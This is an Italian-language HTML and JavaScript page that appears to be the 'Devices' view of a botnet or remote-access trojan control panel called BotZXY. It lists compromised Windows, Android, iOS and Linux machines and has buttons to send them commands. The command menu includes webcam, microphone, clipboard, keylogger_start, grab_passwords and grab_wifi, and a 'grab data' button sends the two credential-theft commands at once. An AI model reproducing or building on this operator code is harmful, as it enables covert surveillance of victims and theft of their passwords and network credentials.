<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>BotZXY · Devices</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family:'Inter',sans-serif; background:var(--bg-primary,#0b0b1a); color:var(--text-primary,#e2e8f0); min-height:100vh; display:flex; }
        .sidebar, .card, .stat-box, .device-card { background:var(--bg-card,rgba(18,18,40,0.45)); border-color:var(--border-color,rgba(255,255,255,0.04)); }
        .sidebar { width:220px; background:rgba(12,12,35,0.92); backdrop-filter:blur(24px); border-right:1px solid rgba(255,255,255,0.04); padding:1.8rem 1.2rem; display:flex; flex-direction:column; min-height:100vh; position:fixed; top:0; left:0; height:100vh; z-index:100; }
        .sidebar .logo { font-size:1.6rem; font-weight:800; background:linear-gradient(135deg,#8b5cf6,#22d3ee); -webkit-background-clip:text; -webkit-text-fill-color:transparent; background-clip:text; padding-bottom:1.5rem; border-bottom:1px solid rgba(255,255,255,0.04); }
        .sidebar .logo i { -webkit-text-fill-color:initial; color:#8b5cf6; }
        .sidebar .logo span { -webkit-text-fill-color:rgba(255,255,255,0.1); }
        .sidebar .nav { display:flex; flex-direction:column; gap:0.2rem; flex:1; padding-top:1.2rem; }
        .sidebar .nav a { display:flex; align-items:center; gap:0.8rem; padding:0.7rem 1rem; border-radius:12px; color:rgba(255,255,255,0.3); text-decoration:none; font-size:0.85rem; font-weight:500; transition:all 0.3s; }
        .sidebar .nav a i { font-size:1.1rem; min-width:24px; }
        .sidebar .nav a:hover { color:#fff; background:rgba(139,92,246,0.08); }
        .sidebar .nav a.active { color:#8b5cf6; background:rgba(139,92,246,0.1); }
        .sidebar .nav a .badge-nav { margin-left:auto; background:rgba(139,92,246,0.15); color:#8b5cf6; font-size:0.6rem; padding:0.1rem 0.6rem; border-radius:40px; }
        .sidebar .footer-sidebar { font-size:0.6rem; color:rgba(255,255,255,0.06); text-align:center; padding-top:1rem; border-top:1px solid rgba(255,255,255,0.04); letter-spacing:0.05em; }
        .sidebar .footer-sidebar .status-dot { display:inline-block; width:6px; height:6px; border-radius:50%; background:#34d399; box-shadow:0 0 12px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; margin-right:6px; }
        @keyframes pulse { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
        .main { margin-left:220px; padding:1.8rem 2.2rem; width:100%; }
        .topbar { display:flex; justify-content:space-between; align-items:center; margin-bottom:2rem; flex-wrap:wrap; gap:0.8rem; }
        .topbar h1 { font-size:1.4rem; font-weight:600; }
        .topbar h1 span { color:rgba(255,255,255,0.2); font-weight:400; }
        .topbar .actions { display:flex; gap:0.6rem; flex-wrap:wrap; }
        .btn-ghost { background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.06); color:rgba(255,255,255,0.4); padding:0.4rem 1rem; border-radius:40px; cursor:pointer; font-size:0.75rem; transition:all 0.3s; display:flex; align-items:center; gap:0.4rem; }
        .btn-ghost:hover { background:rgba(139,92,246,0.08); color:#fff; border-color:rgba(139,92,246,0.2); }
        .card { background:var(--bg-card,rgba(18,18,40,0.45)); backdrop-filter:blur(12px); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:24px; padding:1.5rem; margin-bottom:1.5rem; }
        .card .header { display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem; flex-wrap:wrap; gap:0.5rem; }
        .card .header h2 { font-size:1rem; font-weight:600; display:flex; align-items:center; gap:0.6rem; }
        .card .header h2 i { color:#8b5cf6; }
        .card .header .filter-group { display:flex; gap:0.5rem; align-items:center; flex-wrap:wrap; }
        .card .header .filter-group select, .card .header .filter-group input { background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.3rem 0.8rem; border-radius:8px; font-size:0.75rem; font-family:'Inter',sans-serif; }
        .card .header .filter-group select:focus, .card .header .filter-group input:focus { outline:none; border-color:#8b5cf6; }
        .device-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(250px,1fr)); gap:1rem; }
        .device-card { background:var(--bg-card,rgba(18,18,40,0.3)); border:1px solid var(--border-color,rgba(255,255,255,0.04)); border-radius:16px; padding:1.2rem; transition:all 0.3s; }
        .device-card:hover { border-color:rgba(139,92,246,0.2); transform:translateY(-2px); }
        .device-card .device-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:0.5rem; }
        .device-card .device-header .platform-icon { font-size:1.5rem; opacity:0.6; }
        .device-card .device-name { font-weight:600; font-size:1rem; }
        .device-card .device-ip { font-size:0.75rem; color:rgba(255,255,255,0.3); }
        .device-card .device-info { font-size:0.7rem; color:rgba(255,255,255,0.2); margin-top:0.5rem; }
        .device-card .device-actions { margin-top:0.8rem; display:flex; gap:0.3rem; flex-wrap:wrap; }
        .badge-status { padding:0.15rem 0.6rem; border-radius:40px; font-size:0.6rem; font-weight:600; display:inline-flex; align-items:center; gap:0.3rem; }
        .badge-status.online { background:rgba(52,211,153,0.12); color:#34d399; }
        .badge-status.online::before { content:''; width:5px; height:5px; border-radius:50%; background:#34d399; box-shadow:0 0 8px rgba(52,211,153,0.4); animation:pulse 2s ease-in-out infinite; }
        .badge-status.offline { background:rgba(239,68,68,0.06); color:#f87171; }
        .badge-status.offline::before { content:''; width:5px; height:5px; border-radius:50%; background:#f87171; }
        .btn-action { background:transparent; border:none; color:rgba(255,255,255,0.2); padding:0.2rem 0.4rem; border-radius:8px; cursor:pointer; transition:all 0.2s; font-size:0.8rem; }
        .btn-action:hover { color:#fff; background:rgba(255,255,255,0.04); }
        .btn-action.primary:hover { color:#a78bfa; background:rgba(120,80,255,0.08); }
        .btn-action.danger:hover { color:#f87171; background:rgba(239,68,68,0.08); }
        .btn-action.success:hover { color:#34d399; background:rgba(52,211,153,0.08); }
        .btn-action.warning:hover { color:#fbbf24; background:rgba(245,158,11,0.08); }
        .empty-state { text-align:center; padding:2.5rem; color:rgba(255,255,255,0.1); }
        .empty-state i { font-size:2rem; display:block; margin-bottom:0.5rem; }
        .stats-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:0.8rem; margin-bottom:1.5rem; }
        .stat-box { background:var(--bg-card,rgba(18,18,40,0.3)); border-radius:12px; padding:0.8rem 1rem; text-align:center; border:1px solid var(--border-color,rgba(255,255,255,0.04)); }
        .stat-box .number { font-size:1.5rem; font-weight:700; }
        .stat-box .label { font-size:0.6rem; color:rgba(255,255,255,0.2); text-transform:uppercase; }
        ::-webkit-scrollbar { width:4px; height:4px; }
        ::-webkit-scrollbar-track { background:transparent; }
        ::-webkit-scrollbar-thumb { background:rgba(139,92,246,0.3); border-radius:10px; }
        .sidebar-overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); z-index:90; }
        .sidebar-overlay.active { display:block; }
        .hamburger { display:none; background:rgba(255,255,255,0.04); border:1px solid rgba(255,255,255,0.06); color:#fff; padding:0.4rem 0.8rem; border-radius:10px; cursor:pointer; }
        @media (max-width:768px) { .sidebar { transform:translateX(-100%); width:240px; } .sidebar.open { transform:translateX(0); } .main { margin-left:0; padding:1rem; } .topbar { flex-direction:column; align-items:stretch; } .hamburger { display:block; } .device-grid { grid-template-columns:1fr 1fr; } .stats-row { grid-template-columns:1fr 1fr; } }
        @media (max-width:480px) { .device-grid { grid-template-columns:1fr; } }
    </style>
</head>
<script>
    (function() {
        const savedTheme = localStorage.getItem('botzxy_theme') || 'dark';
        const themes = {
            'dark': { bg: '#0b0b1a', text: '#e2e8f0', card: 'rgba(18,18,40,0.45)', border: 'rgba(255,255,255,0.04)' },
            'light': { bg: '#f1f5f9', text: '#0a0a1a', card: 'rgba(255,255,255,0.85)', border: 'rgba(0,0,0,0.08)' },
            'blue': { bg: '#0a1a3a', text: '#e2e8f0', card: 'rgba(10,26,58,0.7)', border: 'rgba(59,130,246,0.15)' },
            'green': { bg: '#0a1a0a', text: '#e2e8f0', card: 'rgba(10,26,10,0.7)', border: 'rgba(52,211,153,0.15)' },
            'purple': { bg: '#1a0a2a', text: '#e2e8f0', card: 'rgba(26,10,42,0.7)', border: 'rgba(139,92,246,0.15)' },
            'orange': { bg: '#2a1a0a', text: '#e2e8f0', card: 'rgba(42,26,10,0.7)', border: 'rgba(245,158,11,0.15)' },
            'cyber': { bg: '#0a0a0a', text: '#00ff88', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,136,0.15)' },
            'matrix': { bg: '#0a0a0a', text: '#00ff00', card: 'rgba(0,0,0,0.7)', border: 'rgba(0,255,0,0.15)' }
        };
        const t = themes[savedTheme] || themes['dark'];
        
        // Applica variabili CSS
        document.documentElement.style.setProperty('--bg-primary', t.bg);
        document.documentElement.style.setProperty('--text-primary', t.text);
        document.documentElement.style.setProperty('--bg-card', t.card);
        document.documentElement.style.setProperty('--border-color', t.border);
        
        // Applica al body (solo se esiste)
        if (document.body) {
            document.body.style.background = t.bg;
            document.body.style.color = t.text;
            document.body.className = 'theme-' + savedTheme;
        }
        
        // Applica agli elementi esistenti (solo se esistono)
        var selectors = ['.card', '.settings-card', '.stat-card', '.device-card', '.capture-item', '.stat-box', '.chart-card', '.table-card', '.sidebar'];
        for (var i = 0; i < selectors.length; i++) {
            var elements = document.querySelectorAll(selectors[i]);
            for (var j = 0; j < elements.length; j++) {
                if (elements[j]) {
                    elements[j].style.background = t.card;
                    elements[j].style.borderColor = t.border;
                }
            }
        }
        
        var savedLang = localStorage.getItem('botzxy_language') || 'it';
        document.documentElement.lang = savedLang;
    })();
</script>
<body>
    <div class="sidebar-overlay" id="sidebarOverlay" onclick="toggleSidebar()"></div>
    <aside class="sidebar" id="sidebar">
        <div class="logo"><i class="fas fa-robot"></i> Bot<span>ZXY</span></div>
        <nav class="nav">
    <a href="/dashboard" data-i18n="dashboard"><i class="fas fa-tachometer-alt"></i> Dashboard</a>
    <a href="/devices" data-i18n="devices"><i class="fas fa-mobile-alt"></i> Devices <span class="badge-nav" id="deviceBadge">0</span></a>
    <a href="/captures" data-i18n="captures"><i class="fas fa-camera"></i> Captures <span class="badge-nav" id="captureBadge">0</span></a>
    <a href="/analytics" data-i18n="analytics"><i class="fas fa-chart-pie"></i> Analytics</a>
    <a href="/logs" data-i18n="logs"><i class="fas fa-history"></i> Logs</a>
    <a href="/settings" data-i18n="settings"><i class="fas fa-cog"></i> Settings</a>
    <a href="/logout" data-i18n="logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
</nav>
        <div class="footer-sidebar"><span class="status-dot"></span> <span data-i18n="system_active">Sistema attivo</span> · <span id="footerTime"></span></div>
    </aside>
    <main class="main">
        <div class="topbar">
            <div style="display:flex;align-items:center;gap:0.8rem;"><button class="hamburger" onclick="toggleSidebar()"><i class="fas fa-bars"></i></button><h1><span data-i18n="devices">Devices</span> <span>| <span data-i18n="device_management">Gestione dispositivi</span></span></h1></div>
            <div class="actions"><button class="btn-ghost" onclick="refreshDevices()"><i class="fas fa-sync"></i> <span data-i18n="refresh">Aggiorna</span></button></div>
        </div>
        <div class="stats-row">
            <div class="stat-box"><div class="number" style="color:#8b5cf6;" id="totalDevices">0</div><div class="label" data-i18n="total_devices">Totale</div></div>
            <div class="stat-box"><div class="number" style="color:#34d399;" id="onlineDevices">0</div><div class="label" data-i18n="online">Online</div></div>
            <div class="stat-box"><div class="number" style="color:#f87171;" id="offlineDevices">0</div><div class="label" data-i18n="offline">Offline</div></div>
            <div class="stat-box"><div class="number" style="color:#fbbf24;" id="commandsCount">0</div><div class="label" data-i18n="commands">Comandi</div></div>
        </div>
        <div class="card">
            <div class="header">
                <h2><i class="fas fa-list"></i> <span data-i18n="connected_devices">Dispositivi connessi</span></h2>
                <div class="filter-group">
                    <select id="filterPlatform" onchange="applyFilters()"><option value="all" data-i18n="all_platforms">Tutte le piattaforme</option><option value="windows">Windows</option><option value="android">Android</option><option value="ios">iOS</option><option value="linux">Linux</option></select>
                    <select id="filterStatus" onchange="applyFilters()"><option value="all" data-i18n="all_status">Tutti gli stati</option><option value="online" data-i18n="online">Online</option><option value="offline" data-i18n="offline">Offline</option></select>
                    <input type="text" id="searchInput" placeholder="Cerca..." oninput="applyFilters()" style="width:150px;" />
                </div>
            </div>
            <div class="device-grid" id="deviceGrid"></div>
        </div>
    </main>
    <script src="/static/js/config.js"></script>
    <script>
        let devicesData = [];
        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); document.getElementById('sidebarOverlay').classList.toggle('active'); }
        function refreshDevices() {
            const grid = document.getElementById('deviceGrid');
            grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-spinner fa-spin"></i> <span data-i18n="loading">Caricamento...</span></div>`;
            fetch('/api/devices').then(r=>r.json()).then(data=>{ devicesData=data; renderDevices(data); updateStats(data); }).catch(()=>{
                grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-exclamation-triangle"></i> <span data-i18n="error">Errore di connessione</span></div>`;
            });
        }
        function renderDevices(devices) {
            const grid = document.getElementById('deviceGrid');
            const filtered = applyFilters(devices);
            if (!filtered || filtered.length===0) { grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:2rem;color:rgba(255,255,255,0.1);"><i class="fas fa-inbox"></i> <span data-i18n="no_devices">Nessun dispositivo trovato</span></div>`; return; }
            let html = '';
            filtered.forEach(d=>{
                const statusClass = d.is_online ? 'online' : 'offline';
                const statusText = d.is_online ? 'Online' : 'Offline';
                const icon = d.platform==='windows'?'fa-windows':d.platform==='android'?'fa-android':d.platform==='ios'?'fa-apple':'fa-microchip';
                const lastSeen = d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never';
                html += `<div class="device-card"><div class="device-header"><span class="platform-icon"><i class="fab ${icon}" style="color:${d.platform==='windows'?'#00a4ef':d.platform==='android'?'#3ddc84':d.platform==='ios'?'#999':'#666'};"></i></span><span class="badge-status ${statusClass}">${statusText}</span></div><div class="device-name">${d.hostname||'Unknown'}</div><div class="device-ip">${d.ip||'N/A'} · ${d.platform||'Unknown'}</div><div class="device-info">ID: ${d.device_id.substring(0,14)}...<br/><span data-i18n="last_seen">Ultimo visto</span>: ${lastSeen}</div><div class="device-actions"><button class="btn-action success" onclick="sendCommand('${d.device_id}')" title="<span data-i18n='send_command'>Invia comando</span>"><i class="fas fa-terminal"></i></button><button class="btn-action primary" onclick="viewDevice('${d.device_id}')" title="<span data-i18n='details'>Dettagli</span>"><i class="fas fa-eye"></i></button><button class="btn-action warning" onclick="grabData('${d.device_id}')" title="<span data-i18n='extract_data'>Estrai dati</span>"><i class="fas fa-database"></i></button><button class="btn-action danger" onclick="removeDevice('${d.device_id}')" title="<span data-i18n='remove'>Rimuovi</span>"><i class="fas fa-trash"></i></button></div></div>`;
            });
            grid.innerHTML = html;
        }
        function applyFilters(devices) {
            const data = devices || devicesData;
            const platform = document.getElementById('filterPlatform').value;
            const status = document.getElementById('filterStatus').value;
            const search = document.getElementById('searchInput').value.toLowerCase();
            return data.filter(d=>{
                if(platform!=='all' && d.platform!==platform) return false;
                if(status==='online' && !d.is_online) return false;
                if(status==='offline' && d.is_online) return false;
                if(search && !d.hostname?.toLowerCase().includes(search) && !d.device_id?.toLowerCase().includes(search)) return false;
                return true;
            });
        }
        function updateStats(devices) {
            const total = devices.length, online = devices.filter(d=>d.is_online).length;
            document.getElementById('totalDevices').textContent = total;
            document.getElementById('onlineDevices').textContent = online;
            document.getElementById('offlineDevices').textContent = total - online;
            document.getElementById('deviceBadge').textContent = total;
            fetch('/api/stats').then(r=>r.json()).then(data=>{
                document.getElementById('commandsCount').textContent = data.total_commands || 0;
                document.getElementById('captureBadge').textContent = data.total_captures || 0;
            });
        }
        function sendCommand(id) { const cmd=prompt('📡 Invia comando a '+id.substring(0,8)+'...\n\nscreenshot\nwebcam\nmic\nclipboard\nkeylogger_start\ngrab_passwords\ngrab_wifi\nlist_files C:\\','screenshot'); if(cmd){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:cmd,params:''})}).then(()=>alert('✅ Comando inviato')).catch(()=>alert('❌ Errore')); } }
        function viewDevice(id) { alert('👁️ Dettagli dispositivo: '+id); }
        function grabData(id) { if(confirm('⚠️ Estrarre tutti i dati da '+id.substring(0,8)+'...?')){ fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'grab_passwords',params:''})}); fetch(`/api/command/${id}`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'grab_wifi',params:''})}); alert('✅ Estrazione avviata'); } }
        function removeDevice(id) {
    if (!id) {
        alert('❌ ID dispositivo non valido');
        return;
    }
    
    if (confirm('⚠️ Rimuovere il dispositivo ' + id.substring(0, 8) + '...?\n\n' +
                'Verranno eliminati:\n' +
                '• Il dispositivo\n' +
                '• Tutte le catture associate\n' +
                '• Tutti i comandi associati\n' +
                '• Tutti i log associati\n\n' +
                'Questa operazione è irreversibile!')) {
        
        fetch('/api/device/' + id, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(function(res) {
            if (!res.ok) {
                return res.json().then(function(data) {
                    throw new Error(data.error || 'Errore sconosciuto');
                });
            }
            return res.json();
        })
        .then(function(data) {
            if (data.status === 'deleted') {
                alert('✅ Dispositivo rimosso con successo!');
                refreshDevices();
                refreshStats();
            } else {
                alert('❌ Errore: ' + (data.error || 'Operazione fallita'));
            }
        })
        .catch(function(err) {
            console.error('Errore eliminazione:', err);
            alert('❌ Errore: ' + err.message);
        });
    }
}
        function updateTime() { document.getElementById('footerTime').textContent = new Date().toLocaleTimeString('it-IT'); }
        refreshDevices(); setInterval(refreshDevices,15000); setInterval(updateTime,1000); updateTime();
    </script>
</body>
</html>
